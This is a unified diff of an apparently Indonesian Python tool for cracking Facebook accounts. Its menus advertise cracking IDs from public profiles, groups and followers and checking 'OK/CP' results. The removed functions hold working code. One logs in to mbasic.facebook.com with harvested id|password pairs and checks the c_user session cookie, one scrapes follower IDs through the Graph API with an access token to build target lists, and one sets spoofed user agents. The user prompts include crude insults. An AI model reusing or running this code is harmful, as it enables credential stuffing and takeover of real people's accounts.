@@ -171,13 +171,9 @@ def krekefbi():
 	print('[01]>_Crack ID Public')
 	print('[02]>_Crack ID Public [Massal]')
 	print('[03]>_Crack ID Grup')
-	print('[04]>_Crack ID Followers')
-	jalan('>_Menu Set Useragent')
-	print('[05]>_Set UserAGENT')
 	jalan('>_Menu CheckOpsi/Hasil OK CP')
-	print('[06]>_Check Opsi Hasil Checkpoint')
-	print('[07]>_Cek Hasil Crack OK/CP')
-	print('[08]>_Check Opsi Hasil OK')
+	print('[04]>_Check Opsi Hasil Checkpoint')
+	print('[05]>_Cek Hasil Crack OK/CP')
 	print('[00]>_Exit') 
 	badag = input('>_Pilih. :  ')
 	if badag in ['1','01']:
@@ -187,15 +183,9 @@ def krekefbi():
 	elif badag in ['3','03']:
 		bangsat()
 	elif badag in ['4','04']:
-		lonte()
-	elif badag in ['5','05']:
-		tua()
-	elif badag in ['6','06']:
 		muda()
-	elif badag in ['7','07']:
+	elif badag in ['5','05']:
 		pedo()
-	elif badag in ['8','08']:
-		nanut()
 	elif badag in ['0','00']:
 		menu_test()
 	
@@ -205,16 +195,10 @@ def coy():
 	dump_massal()
 def bangsat():
 	grup()
-def lonte():
-	follower
-def tua():
-	useragent()
 def muda():
 	result()
 def pedo():
 	file()
-def nanut():
-	cek_opsit(okc)
 	
 def bottzy():
 	jalan('>_Menu BOT') 
@@ -246,7 +230,7 @@ def menu():
 	#print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
 	#print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
 	#print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
-	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Bot Share Fb\n\x1b[1;95m[05] >_Crack Follower Fb\n\x1b[1;95m[06] >_Cek Hasil Crack\n\x1b[1;95m[07] >_Ganti User Agent\n\033\x1b[1;95m[08] >_Cek Hasil Crack[09] >_Dump ID [Error] [00] >_Keluar [10]>_Masih Diperbaiki'
+	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Cek Hasil Crack\n\033\x1b[1;95m[05] >_Cek Hasil Crack [00] >_Keluar'
 	oi = nel(io, style='cyan')
 	cetak(nel(oi, title='>_Pilih 1 Sampai 8'))
 	jh = input('\033[33m>_Pilih : ')
@@ -257,18 +241,10 @@ def menu():
 	elif jh in ['3','03']:
 		grup()
 	elif jh in ['4','04']:
-		 main()
-	elif jh in ['5','05']:
-		follower()
-	elif jh in ['6','06']:
 		result()
-	elif jh in ['7','07']:
-		useragent()
-	elif jh in ['8','08']:
+	elif jh in ['5','05']:
 		file()
-	elif jh in ['9','09']:
-		dump()
-	#elif jh in ['10','0010']:
+		#elif jh in ['10','0010']:
 		#fritoken()
 	elif jh in ['0','00']:
 		os.system('rm -rf .token.txt')
@@ -693,45 +669,6 @@ def tahun(fx):
         tahunz = ' • 2006/2007'
     else:tahunz=''
     return tahunz
-
-def cek_opsit(okc):
-	c = len(ok)
-	hu = '>_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
-	cetak(nel(hu, title='>_Check Opsi'))
-	input('\033[33m>_Mulai')
-	cek = '>_Proses Check Dimulai'
-	sol().print(mark(cek, style='green'))
-	love = 0
-	for kes in akun:
-		try:
-			try:
-				id,pw = kes.split('|')[0],kes.split('|')[1]
-			except IndexError:
-				time.sleep(2)
-				print('\r%s >> %s >> Error      %s'%(b,kes,x))
-				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
-				continue
-			bi = random.choice([u,k,kk,b,h,hh])
-			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(okc),id,x), end=' ');sys.stdout.flush()
-			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-			ses = requests.Session()
-			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			hi = ses.get('https://mbasic.facebook.com')
-			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
-			if "c_user" in ses.cookies.get_dict().keys():
-				ckp()
-				print('\r%s >> %s|%s >> OK       %s'%(h,id,pw,x))
-			else:
-				print('\r%s >>%s|%s  >> SALAH       %s'%(x,id,pw,x))
-			love+=1
-		except requests.exceptions.ConnectionError:
-			print('')
-			li = '>_Koneksi Internet Bermasalah'
-			sol().print(mark(li, style='red'))
-			exit()
-	dah = '>_Beres'
-	sol().print(mark(dah, style='cyan'))
-	exit()
 
 def cek_apk(ckp):
     apk = []
@@ -1716,76 +1653,6 @@ def main():
 #        print('SINGEK',thread.start())
         thread.start()
         
-def follower():
-    try:
-        token = open('.token.txt', 'r').read()
-    except IOError:
-        exit()
-
-    win = '>_Crack ID Dari Followers'
-    win2 = mark(win, style='cyan')
-    sol().print(win2)
-    print('\033[33m>_Ketik "me" Jika Ingin Dari Follower Mu')
-    pili = input('\033[33m>_Masukkan ID Facebook : ')
-    try:
-        koh2 = requests.get('https://graph.facebook.com/' + pili + '?fields=subscribers.limit(5000)&access_token=' + tokenku[0]).json()
-        for pi in koh2['subscribers']['data']:
-            try:
-                id.append(pi['id'] + '|' + pi['name'])
-            except:
-                continue
-
-        print('\033[33m>_Total : ' + str(len(id)))
-        setting()
-    except requests.exceptions.ConnectionError:
-        li = '>_Koneksi Internet Bermasalah'
-        lo = mark(li, style='red')
-        sol().print(lo, style='cyan')
-        exit()
-    except (KeyError, IOError):
-        teks = '>_Followers Tidak Public Atau Token Rusak'
-        teks2 = mark(teks, style='red')
-        sol().print(teks2)
-        exit()
-
-def useragent():
-	print ("\n%s[%s01%s]>_Ganti user agent "%(P,B,P))
-	print ("%s[%s02%s]>_Cek user agent "%(P,B,P))
-	print ("%s[%s00%s]>_Kembali "%(P,B,P))
-	hikmat = input('\n%s[%s+%s]>_Pilih :%s '%(P,H,P,B))
-	uas(hikmat)
-	
-def uas(hikmat):
-	if hikmat == '':
-		print ('\n%s[%s!%s]>_Yang bener kontol'%(P,B,P));jeda(2)
-		uas(hikmat)
-	elif hikmat in("1","01"):
-		print ("%s[%s!%s]>_Ketik %scancel%s untuk gunakan ua dari script"%(P,B,P,H,P))
-		ua = input("%s[%s!%s]>_User agent :%s "%(P,H,P,B))
-		if ua in(""):
-			print ('\n%s[%s!%s]>_Yang bener kontol'%(P,H,P));jeda(2)
-			menu()
-		elif ua in("CANCEL","Cancel","cancel"):
-			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-			open("ua.txt","w").write(ua_);jeda(2)
-			print ("\n%s[%s✓%s] >_Berhasil menggunakan user agent script "%(P,B,P));jeda(2)
-			pilihan().menu()
-		open("ua.txt","w").write(ua);time.sleep(2)
-		print ("\n%s[%s✓%s]>_Berhasil mengganti user agent"%(P,H,P));time.sleep(2)
-		menu()
-	elif hikmat in("2","02"):
-		try:
-			ua_ = open('ua.txt', 'r').read();time.sleep(2)
-			print ("%s[%s+%s]>_User anget lu :%s%s "%(P,H,P,B,ua_));time.sleep(2)
-			input('\n%s[%s!%s]>_Tekan enter '%(P,B,P))
-			menu()
-		except IOError:
-			ua_ = '%s-'%(M)
-	elif hikmat in("0","00"):
-		menu()
-	else:
-		print ('\n%s[%s!%s]>_Yang bener kontol'%(P,B,P));time.sleep(2)
-		uas(hikmat)
 		
 def token_gratis():
 	clear()
